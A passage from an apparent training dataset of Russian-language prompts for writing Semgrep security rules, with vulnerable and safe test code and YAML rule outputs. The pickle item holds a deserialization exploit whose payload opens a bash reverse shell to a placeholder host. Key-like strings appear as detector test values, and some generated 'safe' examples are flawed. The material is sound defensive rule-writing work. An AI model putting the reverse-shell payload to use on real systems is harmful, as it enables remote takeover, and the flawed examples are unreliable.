let id = req.params.id; let items = req.session.todos[id]; if (!items) { items = req.session.todos[id] = {}; } // ruleid: prototype-pollution-assignment items[req.query.name] = req.query.text; res.end\n\nБезопасные паттерны:  \n• let id = req.params.id; if (id !== 'constructor' && id !== '__proto__') { let items = req.session.todos[id]; if (!items) { items = req.session.todos[id] = {}; } // ok: prototype-pollution-assignment i\n• let items = req.session.todos['id']; if (!items) { items = req.session.todos['id'] = {}; } // ok: prototype-pollution-assignment items[req.query.name] = req.query.text; res.end(200);\n• let id = req.params.id; let items = req.session.todos[id]; if (!items) { items = req.session.todos[id] = {}; } // ok: prototype-pollution-assignment items['name'] = req.query.text; res.end(200);\n\nЛегенда аннотаций:\n- // ruleid:prototype-pollution-assignment: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:prototype-pollution-assignment: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: prototype-pollution-assignment\n  message: >-\n    Possibility of prototype polluting assignment detected.\n    By adding or modifying attributes of an object prototype, it is possible to create\n    attributes that exist on every object,\n    or replace critical attributes with malicious ones.\n    This can be problematic if the software depends on existence or non-existence\n    of certain attributes, or uses pre-defined\n    attributes of object prototype (such as hasOwnProperty, toString or valueOf).\n    Possible mitigations might be: freezing the object prototype, using an object\n    without prototypes (via Object.create(null)\n    ), blocking modifications of attributes that resolve to object prototype, using\n    Map instead of object.\n  metadata:\n    cwe:\n    - 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes'\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    category: security\n    references:\n    - https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\n    technology:\n    - javascript\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern: |\n      $X[$B] = ...\n  - pattern-not: |\n      $X[$B] = '...'\n  - pattern-inside: |\n      $X = $SMTH[$A]\n      ...\n  - pattern-not-inside: |\n      if (<...'constructor' ...>) {\n        ...\n      }\n      ...\n  - pattern-not-inside: |\n      if (<...'__proto__' ...>) {\n        ...\n      }\n      ...\n  - pattern-not-inside: |\n      for(var $B = $S; ...; ...) {...}\n  - pattern-not-inside: |\n      for($B = $S; ...; ...) {...}\n  - pattern-not-inside: |\n      $X.forEach(function $NAME($OBJ, $B,...) {...})\n  - metavariable-pattern:\n      patterns:\n      - pattern-not: '\"...\"'\n      - pattern-not: |\n          `...${...}...`\n      - pattern-not: |\n          ($A: float)\n      metavariable: $A\n  - metavariable-pattern:\n      patterns:\n      - pattern-not: '\"...\"'\n      - pattern-not: |\n          `...${...}...`\n      - pattern-not: |\n          ($B: float)\n      metavariable: $B\n\n\n# Логика правила:\nОбъяснение не сгенерировано\n\n# Ключевые элементы:\n- ID: prototype-pollution-assignment\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "prototype-pollution-assignment",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: avoid-pickle\nОписание уязвимости: Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: pickle.py\n# Import dependencies\nimport os\nimport _pickle\n\n# Attacker prepares exploit that application will insecurely deserialize\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"whoami\",))\n\n\n# Attacker serializes the exploit\ndef serialize_exploit():\n    # ruleid: avoid-pickle\n    shellcode = _pickle.dumps(Exploit())\n    return shellcode\n\n\n# Application insecurely deserializes the attacker's serialized data\ndef insecure_deserialization(exploit_code):\n    # ruleid: avoid-pickle\n    _pickle.loads(exploit_code)\n\n\n# Application insecurely deserializes the attacker's serialized data\ndef insecure_deserialization_2(exploit_code):\n    import _pickle as adaasfa\n\n    # ruleid: avoid-pickle\n    adaasfa.loads(exploit_code)\n\n\nimport cPickle\nimport socket\n\n\nclass Shell_code(object):\n    def __reduce__(self):\n        return (\n            os.system,\n            ('/bin/bash -i >& /dev/tcp/\"Client IP\"/\"Listening PORT\" 0>&1',),\n        )\n\n\n# ruleid: avoid-cPickle\nshell = cPickle.dumps(Shell_code())\n\nimport dill\n\n# ruleid: avoid-dill\nshell = dill.dumps(Shell_code())\n\nimport shelve\n\n# ruleid: avoid-shelve\nmyShelve = shelve.open(Shell_code())\n\nif __name__ == \"__main__\":\n    # Serialize the exploit\n    shellcode = serialize_exploit()\n\n    # Attacker's payload runs a `whoami` command\n    insecure_deserialization(shellcode)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: pickle.py\nimport _pickle\n# ruleid: avoid-pickle\n_shellcode = _pickle.dumps(Exploit())\n• // File: cPickle.py\nimport cPickle\n# ruleid: avoid-cPickle\n_shellcode = cPickle.dumps(Shell_code())\n• // File: dill.py\nimport dill\n# ruleid: avoid-dill\n_shellcode = dill.dumps(Shell_code())\n\nБезопасные паттерны:  \n• // File: safe_pickle.py\nimport _pickle\n# safe: use-pickle\n_data = _pickle.dumps('safe-data')\n• // File: safe_cPickle.py\nimport cPickle\n# safe: use-cPickle\n_data = cPickle.dumps('safe-data')\n• // File: safe_dill.py\nimport dill\n# safe: use-dill\n_data = dill.dumps('safe-data')\n\nЛегенда аннотаций:\n- // ruleid:avoid-pickle: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-pickle: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-pickle\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://docs.python.org/3/library/pickle.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n    - python\n  message: >-\n    Avoid using `pickle`, which is known to lead to code execution vulnerabilities.\n    When unpickling, the serialized data could be manipulated to run arbitrary code.\n    Instead, consider serializing the relevant data as JSON or a similar text-based\n    serialization format.\n  severity: WARNING\n  patterns:\n    - pattern-either:\n      - pattern: pickle.$FUNC(...)\n      - pattern: _pickle.$FUNC(...)\n    - pattern-not: pickle.$FUNC(\"...\")\n    - pattern-not: _pickle.$FUNC(\"...\")\n- id: avoid-cPickle\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://docs.python.org/3/library/pickle.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n    - python\n  message: >-\n    Avoid using `cPickle`, which is known to lead to code execution vulnerabilities.\n    When unpickling, the serialized data could be manipulated to run arbitrary code.\n    Instead, consider serializing the relevant data as JSON or a similar text-based\n    serialization format.\n  severity: WARNING\n  patterns:\n  - pattern: cPickle.$FUNC(...)\n  - pattern-not: cPickle.$FUNC(\"...\")\n- id: avoid-dill\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://docs.python.org/3/library/pickle.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n    - python\n  message: >-\n    Avoid using `dill`, which uses `pickle`, which is known to lead to code execution\n    vulnerabilities.\n    When unpickling, the serialized data could be manipulated to run arbitrary code.\n    Instead, consider serializing the relevant data as JSON or a similar text-based\n    serialization format.\n  severity: WARNING\n  patterns:\n  - pattern: dill.$FUNC(...)\n  - pattern-not: dill.$FUNC(\"...\")\n- id: avoid-shelve\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://docs.python.org/3/library/pickle.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - python\n  message: >-\n    Avoid using `shelve`, which uses `pickle`, which is known to lead to code execution\n    vulnerabilities.\n    When unpickling, the serialized data could be manipulated to run arbitrary code.\n    Instead, consider serializing the relevant data as JSON or a similar text-based\n    serialization format.\n  severity: WARNING\n  pattern: shelve.$FUNC(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования модуля 'pickle' или его производных ('cPickle', 'dill', 'shelve') в Python-коде, которые могут привести к выполнению произвольного кода при десериализации не доверенных данных. Правило использует комбинацию паттернов, включающих функции модулей 'pickle', '_pickle', 'cPickle', 'dill' и 'shelve'. Исключения сделаны для строковых аргументов функций, так как они обычно безопасны.\n\n# Ключевые элементы:\n- ID: avoid-pickle\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-pickle",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: ssrf\nОписание уязвимости: SSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself.\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: rest-client.cs\nusing RestSharp;\n\nnamespace ServerSideRequestForgery\n{\n    public class Ssrf\n    {\n        #region Pattern 1\n        // ruleid: ssrf\n        public void RestClientGet(string host)\n        {\n            try\n            {\n                RestClient client = new RestClient(host);\n\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n\n                result = response.Content;\n\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void RestClientGet(string host)\n        {\n            try\n            {\n                RestClient client = new RestClient(\"constant\");\n\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n\n                result = response.Content;\n\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        #endregion\n\n        #region Pattern 2\n        // ruleid: ssrf\n        public void RestClientGetWithStringConcatenation(string host)\n        {\n            string uri = host + \"constant\";\n\n            try\n            {\n                RestClient client = new RestClient(uri);\n\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n\n                result = response.Content;\n\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void RestClientGetWithStringConcatenation(string host)\n        {\n            string uri = \"constant\";\n\n            try\n            {\n                RestClient client = new RestClient(uri);\n\n                var request = new RestRequest(\"/\");\n                var response = client.Get(request);\n\n                result = response.Content;\n\n  # Ограничиваем длину\n\nОпасные паттерны:\n• public void RestClientGet(string host)\n{\n    try\n    {\n        RestClient client = new RestClient(host);\n        ...\n    }\n    catch (Exception e)\n    {\n        System.Diagnostics.Debug.WriteLine(e);\n\n• public void RestClientGetWithStringConcatenation(string host)\n{\n    string uri = host + \"constant\";\n    try\n    {\n        RestClient client = new RestClient(uri);\n        ...\n    }\n    catch (Exceptio\n• public void RestClientGetWithUri(string host)\n{\n    Uri uri = new Uri(host + \"constant\");\n    try\n    {\n        RestClient client = new RestClient(uri);\n        ...\n    }\n    catch (Exception e)\n    {\n\nБезопасные паттерны:  \n• public void RestClientGet(string host)\n{\n    try\n    {\n        RestClient client = new RestClient(\"constant\");\n        ...\n    }\n    catch (Exception e)\n    {\n        System.Diagnostics.Debug.WriteLin\n• public void RestClientGetWithStringConcatenation(string host)\n{\n    string uri = \"constant\";\n    try\n    {\n        RestClient client = new RestClient(uri);\n        ...\n    }\n    catch (Exception e)\n  \n• public void RestClientGetWithUri(string host)\n{\n    Uri uri = new Uri(\"constant\");\n    try\n    {\n        RestClient client = new RestClient(uri);\n        ...\n    }\n    catch (Exception e)\n    {\n      \n\nЛегенда аннотаций:\n- // ruleid:ssrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ssrf\n  severity: ERROR\n  languages:\n  - csharp\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - .net\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    SSRF is an attack vector that abuses an application to interact with the internal/external network\n    or the machine itself.\n  patterns:\n  - pattern-inside: |\n      using RestSharp;\n      ...\n  - pattern-either:\n    - pattern: |\n        $T $F(..., $X, ...)\n        {\n        ...\n        ... new RestClient(<... $X ...>);\n        }\n    - pattern: |\n        $T $F(..., $X, ...)\n        {\n        ...\n        $A $B = <... $X ...>;\n        ...\n        ... new RestClient($B);\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SSRF (Server-Side Request Forgery) в коде на языке C#. Анализируется использование класса RestClient из библиотеки RestSharp. Правило ищет случаи, когда URL или URI создаются динамически на основе входных параметров ($X), которые могут быть предоставлены пользователем или извне. Это может привести к выполнению запросов к внутренним сетевым ресурсам или машине, что является угрозой безопасности. Безопасный вариант предполагает использование фиксированных значений или констант вместо переменных, полученных извне.\n\n# Ключевые элементы:\n- ID: ssrf\n- Язык: csharp \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "ssrf",
      "language": "csharp",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: detected-stripe-restricted-api-key\nОписание уязвимости: Stripe Restricted API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-stripe-restricted-api-key.txt\n# ruleid: detected-stripe-restricted-api-key\nrk_live_xf2fh0Hu3LqXlqqUg2DEWhEz\n\n# ok: detected-stripe-restricted-api-key\nrk_live_  # Ограничиваем длину\n\nОпасные паттерны:\n• rk_live_xf2fh0Hu3LqXlqqUg2DEWhEz\n• const apiKey = 'rk_live_zx123abc456defghijklmnopqrst';\n\nБезопасные паттерны:  \n• rk_live_\n• let apiKey = 'rk_test_abc123def456ghi789jkl0mnpqrstuvwxyz';\n\nЛегенда аннотаций:\n- // ruleid:detected-stripe-restricted-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-stripe-restricted-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-stripe-restricted-api-key\n  pattern-regex: rk_live_[0-9a-zA-Z]{24}\n  languages: [regex]\n  message: Stripe Restricted API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - stripe\n    confidence: MEDIUM\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило использует регулярное выражение для поиска жестко закодированных Stripe Restricted API ключей. Паттерн ищет строку, начинающуюся с 'rk_live_' за которой следует ровно 24 символа, состоящих из букв и цифр. Это соответствует формату идентификаторов Stripe API. Правило применимо только к текстовым данным, представленным в виде регулярного выражения.\n\n# Ключевые элементы:\n- ID: detected-stripe-restricted-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-stripe-restricted-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения jwt-go-parse-unverified\nОписание уязвимости: Detected the decoding of a JWT token without a verify step. Don't use `ParseUnverified` unless you know what you're doing This method parses the token but doesn't validate the signature. It's only ever useful in cases where you know the signature is valid (because it has been checked previously in the stack) and you want to extract values from it.\nCWE: CWE-345: Insufficient Verification of Data Authenticity\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-345: Insufficient Verification of Data Authenticity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: jwt-parse-unverified.go\npackage main\n\nimport (\n    \"fmt\"\n\n    \"github.com/dgrijalva/jwt-go\"\n)\n\nfunc bad1(tokenString string) {\n    // ruleid: jwt-go-parse-unverified\n    token, _, err := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{})\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    if claims, ok := token.Claims.(jwt.MapClaims); ok {\n        fmt.Println(claims[\"foo\"], claims[\"exp\"])\n    } else {\n        fmt.Println(err)\n    }\n}\n\nfunc ok1(tokenString string, keyFunc Keyfunc) {\n    // ok: jwt-go-parse-unverified\n    token, err := new(jwt.Parser).ParseWithClaims(tokenString, jwt.MapClaims{}, keyFunc)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    if claims, ok := token.Claims.(jwt.MapClaims); ok {\n        fmt.Println(claims[\"foo\"], claims[\"exp\"])\n    } else {\n        fmt.Println(err)\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• token, _, err := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{}); if err != nil { ... }\n• var parsedToken *jwt.Token; parsedToken, _, _ = new(jwt.Parser).ParseUnverified(tokenString, nil)\n• claims, _ := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{}).(jwt.MapClaims)\n\nБезопасные паттерны:  \n• token, err := new(jwt.Parser).ParseWithClaims(tokenString, jwt.MapClaims{}, keyFunc); if err != nil { ... }\n• parsedToken, err := new(jwt.Parser).Parse(tokenString, keyFunc, func(t *jwt.Token) (interface{}, error) { return nil, nil }); if err != nil { ... }\n• claims, err := new(jwt.Parser).ParseWithClaims(tokenString, jwt.MapClaims{}, keyFunc); if err != nil { ... }\n\nЛегенда аннотаций:\n- // ruleid:jwt-go-parse-unverified: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jwt-go-parse-unverified: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jwt-go-parse-unverified\n  message: >-\n    Detected the decoding of a JWT token without a verify step.\n    Don't use `ParseUnverified` unless you know what you're doing\n    This method parses the token but doesn't validate the signature. It's only ever useful in cases where\n    you know the signature is valid (because it has been checked previously in the stack) and you want\n    to extract values from it.\n  metadata:\n    cwe:\n    - 'CWE-345: Insufficient Verification of Data Authenticity'\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  languages: [go]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      import \"github.com/dgrijalva/jwt-go\"\n      ...\n  - pattern: |\n      $JWT.ParseUnverified(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода ParseUnverified из библиотеки jwt-go без последующей проверки подписи JWT-токена. Метод ParseUnverified только разбирает токен, но не проверяет подпись, что может привести к атакам типа man-in-the-middle или подделке токенов. Правило ищет импорт пакета \"github.com/dgrijalva/jwt-go\" и вызов функции ParseUnverified с любым аргументом.\n\n# Ключевые элементы:\n- ID: jwt-go-parse-unverified\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "jwt-go-parse-unverified",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aws-sns-topic-unencrypted\nОписание уязвимости: The AWS SNS topic is unencrypted. The SNS topic messages could be read if compromised. The AWS KMS encryption key protects topic contents. To create your own, create a aws_kms_key resource or use the ARN string of a key in your account.\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-sns-topic-unencrypted.tf\n# ok: aws-sns-topic-unencrypted\nresource \"aws_sns_topic\" \"pass\" {\n  kms_master_key_id = \"someKey\"\n}\n# ruleid: aws-sns-topic-unencrypted\nresource \"aws_sns_topic\" \"fail\" {}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_sns_topic\" \"fail\" {}\n• resource \"aws_sns_topic\" \"another_fail\" { }\n\nБезопасные паттерны:  \n• resource \"aws_sns_topic\" \"pass\" { kms_master_key_id = \"someKey\" }\n• resource \"aws_sns_topic\" \"safe\" { kms_master_key_id = var.key_arn }\n\nЛегенда аннотаций:\n- // ruleid:aws-sns-topic-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-sns-topic-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-sns-topic-unencrypted\n  patterns:\n  - pattern: |\n      resource \"aws_sns_topic\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_sns_topic\" $ANYTHING {\n        ...\n        kms_master_key_id = ...\n        ...\n      }\n  message: The AWS SNS topic is unencrypted. The SNS topic messages could be read\n    if compromised. The AWS KMS encryption key protects topic contents. To create\n    your own, create a aws_kms_key resource or use the ARN string of a key in your\n    account.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов aws_sns_topic в конфигурационном файле Terraform без атрибута kms_master_key_id, который отвечает за шифрование сообщений темы Amazon SNS. Правило использует шаблон ресурса aws_sns_topic и проверяет наличие или отсутствие атрибута внутри шаблона. Если атрибут отсутствует, генерируется предупреждение о возможной угрозе безопасности, связанной с отсутствием шифрования сообщений.\n\n# Ключевые элементы:\n- ID: aws-sns-topic-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-sns-topic-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: hardcoded-conditional\nОписание уязвимости: This if statement will always have the same behavior and is therefore unnecessary.\nCWE: \nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: hardcoded-conditional.java\nclass Bar {\n    void main(boolean arg) {\n        boolean myBoolean;\n\n        // ruleid:hardcoded-conditional\n        if (myBoolean = true) {\n            continue;\n        }\n        // note that with new constant propagation, myBoolean is assumed\n        // to true below\n\n        // ruleid:hardcoded-conditional\n        if (true) {\n            continue;\n        }\n\n        // ruleid:hardcoded-conditional\n        if (true && false) {\n            continue;\n        }\n\n        // the dataflow constant-propagation now kicks in! this is true!\n        // ruleid:hardcoded-conditional\n        if (myBoolean) {\n\n        }\n        // to prevent constant propagation to assumes\n        // myBoolean is true below\n        myBoolean = arg;\n\n        // ok:hardcoded-conditional\n        if (myBoolean == myBoolean) {\n            continue;\n        }\n\n        // ok:hardcoded-conditional\n        if (myBoolean != myBoolean) {\n            continue;\n        }\n\n        // ok:hardcoded-conditional\n        if (moveToChild(curs, index, false, false))\n        {\n            removeToken(curs);\n        }\n\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• if (myBoolean = true) { ... }\n• if (true) { ... }\n• if (true && false) { ... }\n\nБезопасные паттерны:  \n• if (myBoolean == myBoolean) { ... }\n• if (myBoolean != myBoolean) { ... }\n• if (moveToChild(curs, index, false, false)) { ... }\n\nЛегенда аннотаций:\n- // ruleid:hardcoded-conditional: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hardcoded-conditional: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: hardcoded-conditional\n    patterns:\n      - pattern-either:\n          - pattern: if (true) { ... }\n          - pattern: if (false) { ... }\n          - pattern: if ($VAR = true) { ... }\n          - pattern: if ($VAR = false) { ... }\n          - pattern: if ($EXPR && false) { ... }\n          - pattern: if (false && $EXPR) { ... }\n          - pattern: if ($EXPR || true) { ... }\n          - pattern: if (true || $EXPR) { ... }\n    message: This if statement will always have the same behavior and is therefore unnecessary.\n    languages: [java]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных условных выражений, которые всегда будут иметь одинаковое поведение и являются излишними. Анализ выполняется путем поиска конструкций if с жестко заданными значениями true или false, либо присваиваний переменным этих значений внутри условия. Также проверяются выражения, содержащие логические операции AND и OR с фиксированными значениями. Правило использует шаблон pattern-either для объединения различных типов опасных паттернов.\n\n# Ключевые элементы:\n- ID: hardcoded-conditional\n- Язык: java \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "hardcoded-conditional",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detected-telegram-bot-api-key\nОписание уязвимости: Telegram Bot API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-telegram-bot-api-key.php\n<?php\n\n// ruleid: detected-telegram-bot-api-key\ndefine('BOT_TOKEN', '12345678:AA101703Wd8JLT6GCtKzxatRHQREQUk_CpK');\ndefine('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');\n\n// ok: detected-telegram-bot-api-key\ndefine('GO.MOD', 'github.com/gorilla/mux v1.7.4/go.mod 11:AAbg23sWSpFRCP0SfiEN6jmj59UnWan46BH5rLB7');\n// ok: detected-telegram-bot-api-key\ndefine('DO_NOT_DETECT_ME', 'github.com/valyala/fasthttp v1.24.0 h1:AAiG4oLDUArTb7rYf9oO2bkGooOqCaUF6a2u8asBP3I=')\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: detected-telegram-bot-api-key\ndefine('BOT_TOKEN', '12345678:AA101703Wd8JLT6GCtKzxatRHQREQUk_CpK');\n• // ruleid: detected-telegram-bot-api-key\ndefine('TELEGRAM_BOT_KEY', '98765432:ABCD123456789012345678901234567890')\n\nБезопасные паттерны:  \n• // ok: detected-telegram-bot-api-key\ndefine('GO.MOD', 'github.com/gorilla/mux v1.7.4/go.mod 11:AAbg23sWSpFRCP0SfiEN6jmj59UnWan46BH5rLB7')\n• // ok: detected-telegram-bot-api-key\ndefine('DO_NOT_DETECT_ME', 'github.com/valyala/fasthttp v1.24.0 h1:AAiG4oLDUArTb7rYf9oO2bkGooOqCaUF6a2u8asBP3I=')\n\nЛегенда аннотаций:\n- // ruleid:detected-telegram-bot-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-telegram-bot-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
